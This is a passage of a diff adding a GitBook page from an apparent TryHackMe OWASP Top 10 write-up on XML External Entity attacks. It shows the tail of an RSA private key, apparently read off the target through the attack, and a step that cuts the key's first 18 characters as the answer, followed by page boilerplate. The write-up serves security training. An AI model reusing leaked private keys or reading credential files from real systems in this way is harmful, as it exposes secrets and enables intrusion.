MPm4aUDikZHKhQ5OOge+wzPNXVR6Yy1VV3WZfxRCoEuq6fYEJsKB5tykfQPC8cUn qwGvo8TiMHbQ9KmI5FabfBK8LswQ575bnLtMxdPyBCgYqlsAIkPYQAOizUVlrOOg faKF5VknsONM9DC3ZNx5L1zQXbsIrWbEPsRlytECgYB7CXr/IZwLfeqUfu7yoq3R sJKtbhYf+S4hhTPcOCQd13e8n10/HZg0CzXpZbGieusQ3lIml9Ouusp8ML0Y3aIe f9pmP+UKnEdqUMMLg/RhowHRlD9qm0F4lf1CbQh/NK01I5ore6SPUM7fqWv4UWDr wZzIfad/RbWxQooYtYXvUQKBgFDLcBIdpYX1x16aX1AfqLMWgRSrQqNj9UXmQa0g 83OvXmGdkbQoUfjjz1I/i10x00cycxjqpfn9htIIptG7J6i92SnTj0Vl9eTOQ1qz N9y5qVhcURHrVh0+vy3LzNACv73y5gDw2L7PJoo0GYODn8j4eAFZJpg3qlQpovTw HtOxAoGABqwywFKFNTYgrl17Rs4g3H1nc0EhOzGetRaRL2bcvQsZevuWyswp0Mbm 9nlgNAtxttsmfL+OU7nP3I4YQlyZed4luRWcRaXrvGMqfEL4wzRez5ZxMnZM/IlQ 9DBlD9C7t5MI3aXR3A5zFVVINomwHH7aGfeha1JRXXAtasLTVvA= -----END RSA PRIVATE KEY-----
+</code></pre>
+</li>
+<li>Put it inside a file and then use head command to get the first 18 characters: <code>head -c 18 &lt;FILE&gt;</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="SensitiveDataExposure.html" class="navigation navigation-prev " aria-label="Previous page: Sensitive Data Exposure">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="BrokenAccessControl.html" class="navigation navigation-next " aria-label="Next page: Broken Access Control">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"XML External Entity","level":"2.6.4","depth":2,"next":{"title":"Broken Access Control","level":"2.6.5","depth":2,"path":"TryHackMe/OWASPTop10/BrokenAccessControl.md","ref":"TryHackMe/OWASPTop10/BrokenAccessControl.md","articles":[]},"previous":{"title":"Sensitive Data Exposure","level":"2.6.3","depth":2,"path":"TryHackMe/OWASPTop10/SensitiveDataExposure.md","ref":"TryHackMe/OWASPTop10/SensitiveDataExposure.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"TryHackMe/OWASPTop10/XMLExternalEntity.md","mtime":"2020-12-29T15:06:12.923Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-02-13T19:16:38.703Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
